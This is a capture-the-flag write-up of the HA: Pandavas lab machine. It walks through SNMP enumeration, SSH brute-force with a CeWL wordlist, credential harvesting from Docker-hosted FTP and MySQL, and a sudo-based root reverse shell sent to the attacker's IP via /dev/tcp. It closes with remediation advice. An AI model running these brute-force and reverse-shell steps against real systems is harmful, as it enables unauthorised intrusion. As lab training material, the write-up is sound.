# HA: Pandavas — Writeup

| Field | Value |
|---|---|
| **Target IP** | 192.168.10.162 |
| **Attacker IP** | 192.168.10.161 |
| **Difficulty** | Medium |
| **OS** | Linux |
| **Goal** | 5 flags (hidden.docx, SNMP, FTP history, MySQL, root) |
| **Source** | [HackingArticles](https://www.hackingarticles.in/ha-pandavas-vulnhub-walkthrough/) |

## Attack Summary

HA: Pandavas is a multi-flag machine themed around the Mahabharata epic. It exposes HTTP (port 80), SSH (port 22), SNMP (UDP 161), along with Docker containers running FTP and MySQL services. The attack chain involves web enumeration to find a hidden Word document, SNMP walking to discover credentials and a flag, SSH brute-force with a custom CeWL wordlist, lateral movement between users, container enumeration, and finally sudo abuse to obtain a root reverse shell.

## Methodology

1. Network scanning (Nmap TCP + UDP)
2. Web enumeration with Dirb
3. SNMP enumeration with snmpwalk
4. Custom wordlist generation (CeWL)
5. SSH brute-force via Metasploit
6. Docker container service enumeration
7. FTP access inside Docker container
8. MySQL dump inside Docker container
9. Privilege escalation via sudo unrestricted shell

## Step 1: Reconnaissance

### Host Discovery

```bash
netdiscover -r 192.168.10.0/24
```

![netdiscover](images/01-nmap.png)

### TCP Port Scan

```bash
nmap -sV -p- 192.168.10.162
```

Open ports:
- **22/tcp** — OpenSSH
- **80/tcp** — HTTP (Apache)

### UDP Scan (SNMP Discovery)

```bash
nmap -sU -p 161 192.168.10.162
```

- **161/udp** — SNMP

## Step 2: Web Enumeration

### Directory Brute-Force with Dirb

```bash
dirb http://192.168.10.162/ /usr/share/wordlists/dirb/big.txt -X .php,.docx,.txt
```

The scan reveals `hidden.docx` in the web root.

```bash
wget http://192.168.10.162/hidden.docx
```

Opening the document reveals **Flag 1** embedded in the document text.

### Custom Wordlist with CeWL

```bash
cewl http://192.168.10.162/ -m 4 -w /tmp/pandavas_wordlist.txt
```

This generates a wordlist from the page's Mahabharata-themed content, which will be used for SSH brute-force.

## Step 3: SNMP Enumeration

```bash
snmpwalk -v1 -c public 192.168.10.162 | more
```

![snmpwalk](images/02-dirb.png)

The SNMP walk leaks:
- **Flag 2** in the MIB tree output
- Username: `karna`

## Step 4: SSH Brute-Force

### Against user `karna`

```bash
msfconsole -q
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.10.162
set USERNAME karna
set PASS_FILE /tmp/pandavas_wordlist.txt
set VERBOSE false
run
```

The module finds the password for `karna`. Log in:

```bash
ssh karna@192.168.10.162
```

### Lateral Movement to `krishna`

Inspect other users in `/etc/passwd` and `/home`. Run the SSH scanner against `krishna`:

```bash
use auxiliary/scanner/ssh/ssh_login
set USERNAME krishna
set PASS_FILE /tmp/pandavas_wordlist.txt
run
```

```bash
ssh krishna@192.168.10.162
```

Check sudo privileges:

```bash
sudo -l
```

`krishna` has unrestricted `sudo` access — this will be used for privilege escalation.

## Step 5: Docker Container Enumeration

Check network interfaces and running processes:

```bash
ip addr
ps aux
```

Docker networking is visible. FTP and MySQL services are running inside containers.

### FTP Access

```bash
ftp 172.17.0.2
```

Log in anonymously or with discovered credentials, then navigate to the root folder:

```bash
ftp> ls
ftp> cd root
ftp> ls -la
ftp> get .ash_history
```

Read the history file:

```bash
cat .ash_history
```

**Flag 3** appears in the history. The file also contains a Base64-encoded password.

```bash
echo '<base64_string>' | base64 -d
```

## Step 6: MySQL Inside Docker

![mysql](images/03-snmp.png)

The decoded credential from `.ash_history` is the MySQL root password. Connect to the MySQL container:

```bash
mysqldump -A -u root --password=ignite@123 | grep -i flag
```

**Flag 4** is embedded in one of the database tables.

## Step 7: Privilege Escalation — Root Shell via Sudo

![privesc](images/04-docker.png)

Set up a listener on the attacker machine:

```bash
nc -nvlp 4444
```

On the victim, as `krishna` (who has unrestricted sudo):

```bash
sudo -u root bash -i >& /dev/tcp/192.168.10.161/4444 0>&1
```

The listener catches a root shell.

## Step 8: Root Flag

![root-flag](images/05-root.png)

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
ls /root
cat /root/flag.txt
```

**Flag 5** — the final root flag.

## Credentials Summary

| User | Service | Password |
|---|---|---|
| `karna` | SSH | (CeWL wordlist — shown in screenshots) |
| `krishna` | SSH | (CeWL wordlist — shown in screenshots) |
| `root` | MySQL (Docker) | `ignite@123` |

## Lessons Learned

1. **SNMP with public community string** exposes sensitive system information including usernames and can leak flags or credentials directly from the MIB tree.
2. **CeWL-generated wordlists** are highly effective when standard wordlists fail — always tailor the wordlist to the target's content and theme.
3. **Docker containers on internal interfaces** often run services with weak or default credentials and are overlooked during enumeration.
4. **Unrestricted sudo access** (`sudo ALL`) gives immediate root — always check `sudo -l` after gaining any shell.
5. **History files** (`.bash_history`, `.ash_history`) are a goldmine for credentials and sensitive information.

## Remediation

| Vulnerability | Fix |
|---|---|
| SNMP public community string | Change to a strong, non-guessable community string; restrict SNMP access by IP |
| Weak SSH passwords | Enforce strong password policy; prefer key-based authentication |
| Unrestricted sudo for regular user | Apply principle of least privilege; restrict sudo to specific commands only |
| MySQL default password in Docker | Use unique, strong passwords for all container services |
| Sensitive data in shell history | Clear history after use; avoid storing credentials in commands; use `.netrc` or vaults |
| Hidden files in FTP root | Restrict FTP root directory; apply proper file permissions |
